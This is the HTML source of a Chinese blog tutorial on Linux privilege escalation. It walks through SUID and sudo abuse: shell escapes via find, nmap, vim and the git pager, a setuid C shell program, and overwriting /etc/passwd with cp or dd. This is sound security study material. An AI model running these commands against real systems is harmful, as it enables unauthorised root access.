@@ -1,0 +1,514 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Linux特殊权限位 | Ttoc's blog</title><meta name="author" content="Ttoc"><meta name="copyright" content="Ttoc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="linux提权学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux特殊权限位">
+<meta property="og:url" content="https://ttoc.fun/2023/02/13/Linux-PowerUp/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="linux提权学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ttoc.fun/img/17.jpg">
+<meta property="article:published_time" content="2023-02-13T13:47:50.911Z">
+<meta property="article:modified_time" content="2023-08-13T02:38:53.439Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttoc.fun/img/17.jpg"><link rel="shortcut icon" href="/img/website.png"><link rel="canonical" href="https://ttoc.fun/2023/02/13/Linux-PowerUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Linux特殊权限位',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-08-13 10:38:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/progress_bar.css"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head><body><link rel="stylesheet" href="/css/barber-shop.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/17.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ttoc's blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> Archives</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Linux特殊权限位</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-13T13:47:50.911Z" title="发表于 2023-02-13 21:47:50">2023-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-13T02:38:53.439Z" title="更新于 2023-08-13 10:38:53">2023-08-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/daily/">daily</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>linux提权学习</code></p>
+<span id="more"></span>
+
+<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">参考文章</a></p>
+<h2 id="1）利用SUID提权"><a href="#1）利用SUID提权" class="headerlink" title="1）利用SUID提权"></a>1）利用SUID提权</h2><h3 id="什么是suid？"><a href="#什么是suid？" class="headerlink" title="什么是suid？"></a>什么是suid？</h3><blockquote>
+<p>Set User ID的一种权限类型，允许用户使用指定的用户权限执行文件。那些具用suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，并且我们发现二进制文件启用了suid位，那么<br>这些文件&#x2F;程序&#x2F;命令可以以root权限运行</p>
+<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限的资源</p>
+</blockquote>
+<h3 id="什么是SGID"><a href="#什么是SGID" class="headerlink" title="什么是SGID"></a>什么是SGID</h3><blockquote>
+<p>G的意思就是<code>group</code>，功能和<code>suid</code>基本不相同，唯一区别就是<code>suid</code>获得命令所属用户的身份和权限，而<code>sgid</code>是获取所属用户组的身份和权限</p>
+</blockquote>
+<h3 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h3><blockquote>
+<p>1，SUID权限只能设置二进制文件。</p>
+<p>2，命令执行者要有二进制文件的执行权。</p>
+<p>3，命令执行者执行二进制文件时会获得该程序的属主身份。</p>
+<p>4，SUID权限只在程序执行过程中有效。</p>
+<p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
+</blockquote>
+<hr>
+<h3 id="关键"><a href="#关键" class="headerlink" title="*关键"></a>*关键</h3><p>1.查看具有<code>root</code>用户权限的<code>SUID</code>二进制可执行文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">命令来查找拥有SUID权限的程序。</span><br><span class="line"></span><br><span class="line">perm指定权限，<span class="attribute">-u</span>=s代表SUID权限，type指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure>
+
+<p>2.已知的可用来提权的<code>linux</code>可执行的文件列表如下</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap、Vim、<span class="built_in">find</span>、Bash、<span class="built_in">More</span>、Less、Nano、cp</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="（1）利用find获取root权限shell"><a href="#（1）利用find获取root权限shell" class="headerlink" title="（1）利用find获取root权限shell"></a>（1）利用find获取root权限shell</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> filename -<span class="built_in">exec</span> “/bin/sh” \;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个filename，只要存在就行，目的是让find命令可以成功执行，后面的-exec就是加上命令</p>
+<p>这里find有suid权限，普通用户执行时，会变成root用户，执行&#x2F;bin&#x2F;sh命令时，会进入root用户，从而实现提权</p>
+<p>如果find没有suid权限，执行&#x2F;bin&#x2F;sh命令后，仍然是普通用户</p>
+<p>·&#x2F;为根目录<br>·-name 按文件名查找<br>·-exec 对匹配对象执行的命令，以;结束<br>但是（;）是特殊字符，需要用（\）转义</p>
+</blockquote>
+<h4 id="（2）利用cp获取root权限shell"><a href="#（2）利用cp获取root权限shell" class="headerlink" title="（2）利用cp获取root权限shell"></a>（2）利用cp获取root权限shell</h4><blockquote>
+<p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830133409844.png" alt="image-20220830133409844"></p>
+<p>可以通过</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p>命令来查找拥有SUID权限的程序。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830133446426.png" alt="image-20220830133446426"></p>
+<blockquote>
+<p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
+<p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码abcd</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830133504874.png" alt="image-20220830133504874"></p>
+<blockquote>
+<p>然后按照etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830133645874.png" alt="image-20220830133645874"></p>
+<blockquote>
+<p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830133656254.png" alt="image-20220830133656254"></p>
+<h4 id="（3）利用Vim获取root权限shell"><a href="#（3）利用Vim获取root权限shell" class="headerlink" title="（3）利用Vim获取root权限shell"></a>（3）利用Vim获取root权限shell</h4><blockquote>
+<p>vim在有SUID权限的情况下，也可用来进行提权操作。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830134124700.png" alt="image-20220830134124700"></p>
+<blockquote>
+<p>当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如通过vim来编辑etc&#x2F;sudoers文件（普通用户会被直接拒绝访问），在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例，添加如下内容：</p>
+</blockquote>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>vim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。</p>
+<p>随后sudo bash就会获取一个root的shell。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830134159252.png" alt="image-20220830134159252"></p>
+<h4 id="（4）利用nmap获取root权限shell"><a href="#（4）利用nmap获取root权限shell" class="headerlink" title="（4）利用nmap获取root权限shell"></a>（4）利用nmap获取root权限shell</h4><h5 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h5><blockquote>
+<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
+</blockquote>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>
+
+<p>之后执行:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>
+
+<p>msf中的模块为：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h5><blockquote>
+<p>较新版可使用 <code>--script</code> 参数：</p>
+</blockquote>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先写入一条命令</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">再<span class="params">--script</span>参数，执行</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20221011132253611.png" alt="image-20221011132253611"></p>
+<h4 id="（5）利用脚本获取root权限shell"><a href="#（5）利用脚本获取root权限shell" class="headerlink" title="（5）利用脚本获取root权限shell"></a>（5）利用脚本获取root权限shell</h4><blockquote>
+<p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
+</blockquote>
+<p>示例代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用gcc进行编译。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830134227202.png" alt="image-20220830134227202"></p>
+<p>编译后传入目标机，这里放到bin&#x2F;aaa目录下，然后添加SUID权限测试。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830134236889.png" alt="image-20220830134236889"></p>
+<p>普通用户执行该文件后，会返回一个root权限的shell。</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220830134252824.png" alt="image-20220830134252824"></p>
+<h2 id="2）利用SUDO提权"><a href="#2）利用SUDO提权" class="headerlink" title="2）利用SUDO提权"></a>2）利用SUDO提权</h2><h3 id="sudo和su的区别"><a href="#sudo和su的区别" class="headerlink" title="sudo和su的区别"></a><strong>sudo和su的区别</strong></h3><blockquote>
+<p>1，sudo是以root权限去运行一个命令，su是去切换用户的身份。</p>
+<p>2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。</p>
+</blockquote>
+<h3 id="sudoers文件"><a href="#sudoers文件" class="headerlink" title="sudoers文件"></a><strong>sudoers文件</strong></h3><blockquote>
+<p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
+</blockquote>
+<p>例如添加test用户的相关配置：</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901223741370.png" alt="image-20220901223741370"></p>
+<p>格式如下：</p>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901223808981.png" alt="image-20220901223808981"></p>
+<h3 id="sudo-su-sudo-bash"><a href="#sudo-su-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h3><blockquote>
+<p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901223824172.png" alt="image-20220901223824172"></p>
+<blockquote>
+<p>或者执行sudo bash。</p>
+</blockquote>
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901223837242.png" alt="image-20220901223837242"></p>
+<blockquote>
+<p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑sudoers文件，且wq!可以成功保存。</p>
+</blockquote>
+<h4 id="SUDO-dd-提权法"><a href="#SUDO-dd-提权法" class="headerlink" title="*SUDO -dd 提权法"></a>*SUDO -dd 提权法</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">原文</a>            </p>
+<blockquote>
+<p>当用户可以通过sudo执行dd命令时，可以被用来提权。通过dd命令覆盖原始&#x2F;etc&#x2F;passwd文件，以达到修改密码的目的</p>
+</blockquote>
+<p>1、创建一个已知密码的hash，以备替换时使用</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure>
+
+<p>2、备份原始passwd文件，以防修改错误时无法访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/passwd /tmp/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>3、利用第一步里生成的hash构建新的passwd hash条目</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<p>4、使用dd覆盖原始passwd文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure>
+
+<p>5、使用刚才创建hash时使用的密码进行登录</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>提权成功！</p>
+<h4 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="comment">//列出目前用户可执行与无法执行的指令。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/13/Linux-PowerUp/image-20220901112624228.png" alt="image-20220901112624228"></p>
+<p><strong><u>就可以发现<code>root</code>以<code>nopasswd</code>【不需要密码】运行git命令</u></strong></p>
+<p>原理是git存在缓存区溢出漏洞，</p>
+<p>在使用</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>
+
+<p>不需要输入root密码，即可以root身份执行这条命令</p>
+<p>操作如下</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span>     </span><br><span class="line">//-<span class="selector-tag">p</span>是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure>
+
+<p>下面可以看看区别</p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h5><h6 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h6><p><img src="/2023/02/13/Linux-PowerUp/image-20220901113721300.png" alt="image-20220901113721300"></p>
+<p>可以看到显示完了，就有回到原处了</p>
+<h6 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h6><p><img src="/2023/02/13/Linux-PowerUp/image-20220901113851826.png" alt="image-20220901113851826"></p>
+<p>下方就显示出:，等待输入</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h5><p><code>$</code>变成<code>#</code>成功</p>
